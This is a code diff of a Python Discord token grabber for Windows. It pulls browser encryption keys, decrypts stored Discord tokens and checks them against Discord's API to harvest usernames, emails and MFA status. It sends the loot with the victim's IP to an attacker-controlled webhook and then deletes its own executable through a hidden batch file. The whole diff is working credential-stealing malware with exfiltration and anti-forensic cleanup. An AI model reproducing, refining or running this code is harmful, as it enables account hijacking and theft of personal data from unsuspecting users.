@@ -1,12 +1,13 @@
-import os, sys, json, base64, urllib.request, re, ctypes
+import os, sys, json, base64, re, subprocess, ctypes
 from datetime import datetime
-from pathlib import Path
+import requests
+from Crypto.Cipher import AES
+import win32crypt
+
+WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL_HERE"  # <-- CHANGE THIS
 
 if os.name != "nt":
     sys.exit(0)
-else:
-    import win32crypt
-    from Crypto.Cipher import AES
 
 LOCAL = os.getenv("LOCALAPPDATA", "")
 ROAMING = os.getenv("APPDATA", "")
@@ -24,23 +25,20 @@ PATHS = {
     'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default'
 }
 
-WEBHOOK = "WEBHOOK_URL"
-
-def cleanup():
+def send_webhook(content, file=None):
     try:
-        if hasattr(sys, 'frozen'):
-            exe_path = sys.executable
-            bat_path = os.path.join(TEMP, 'c.bat')
-            with open(bat_path, 'w') as f:
-                f.write(f'@echo off\ntimeout /t 2 /nobreak >nul\ndel /f /q "{exe_path}"\ndel /f /q "%~f0"')
-            subprocess.Popen(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-    except:
-        pass
+        if file:
+            with open(file, "rb") as f:
+                requests.post(WEBHOOK, files={"file": f})
+        else:
+            requests.post(WEBHOOK, json={"content": content})
+    except Exception as e:
+        print(f"Webhook error: {e}")
 
 def getkey(path):
     try:
         with open(path + "\\Local State", "r", encoding='utf-8', errors='ignore') as f:
-            return json.loads(f.read())['os_crypt']['encrypted_key']
+            return json.load(f)['os_crypt']['encrypted_key']
     except:
         return None
 
@@ -72,73 +70,69 @@ def decrypt_token(encrypted_token, key):
 
 def getip():
     try:
-        with urllib.request.urlopen("https://api.ipify.org?format=json", timeout=5) as r:
-            return json.loads(r.read().decode()).get("ip", "unknown")
+        return requests.get("https://api.ipify.org?format=json", timeout=5).json().get("ip", "unknown")
     except:
         return "unknown"
 
-def send_webhook(data):
-    try:
-        payload = json.dumps({"content": f"`{base64.b64encode(json.dumps(data).encode()).decode()}`"})
-        req = urllib.request.Request(
-            WEBHOOK,
-            data=payload.encode(),
-            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
-            method='POST'
-        )
-        urllib.request.urlopen(req, timeout=10)
-    except:
-        pass
-
 def main():
+    print("Starting Discord token grabber...")
+    send_webhook(content="**Token grabber started**")
     checked = []
     results = {"ip": getip(), "user": os.getenv("USERNAME", "unknown"), "tokens": []}
-    
+
     for platform, path in PATHS.items():
         if not os.path.exists(path):
+            print(f"Skipping {platform}: path not found")
             continue
-            
+
         key = getkey(path)
         if not key:
+            print(f"Skipping {platform}: no key found")
             continue
-            
+
+        print(f"Searching {platform}...")
         for token in gettokens(path):
             token = token.rstrip("\\")
             decrypted = decrypt_token(token, key)
             if not decrypted or decrypted in checked:
                 continue
             checked.append(decrypted)
-            
             try:
-                req = urllib.request.Request(
-                    'https://discord.com/api/v10/users/@me',
-                    headers={"Authorization": decrypted, "User-Agent": "Mozilla/5.0"},
-                    method='GET'
-                )
-                with urllib.request.urlopen(req, timeout=5) as res:
-                    user = json.loads(res.read().decode())
-                    
-                results["tokens"].append({
-                    "token": decrypted,
-                    "username": user.get("username", "unknown"),
-                    "userid": user.get("id", "unknown"),
-                    "email": user.get("email", "none"),
-                    "source": platform,
-                    "verified": user.get("verified", False),
-                    "mfa": user.get("mfa_enabled", False)
-                })
+                user_req = requests.get('https://discord.com/api/v10/users/@me', headers={"Authorization": decrypted})
+                if user_req.status_code == 200:
+                    user = user_req.json()
+                    results["tokens"].append({
+                        "token": decrypted,
+                        "username": user.get("username", "unknown"),
+                        "userid": user.get("id", "unknown"),
+                        "email": user.get("email", "none"),
+                        "source": platform,
+                        "verified": user.get("verified", False),
+                        "mfa": user.get("mfa_enabled", False)
+                    })
+                    print(f"Found token for {user.get('username')}")
             except:
                 continue
-    
+
     if results["tokens"]:
-        send_webhook(results)
-    
+        send_webhook(content=f"```json\n{json.dumps(results, indent=2)}\n```")
+        print(f"Sent {len(results['tokens'])} tokens to webhook")
+    else:
+        send_webhook(content="No Discord tokens found on this PC.")
+        print("No tokens found")
+
+    # Optional: clean up (self-delete if compiled)
     try:
-        ctypes.windll.kernel32.SetFileAttributesW(sys.executable, 2)
+        if hasattr(sys, 'frozen'):
+            exe_path = sys.executable
+            bat_path = os.path.join(TEMP, 'clean.bat')
+            with open(bat_path, 'w') as f:
+                f.write(f'@echo off\ntimeout /t 2 /nobreak >nul\ndel /f /q "{exe_path}"\ndel /f /q "%~f0"')
+            subprocess.Popen(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
     except:
         pass
-        
-    cleanup()
+
+    print("Done.")
 
 if __name__ == "__main__":
     main()
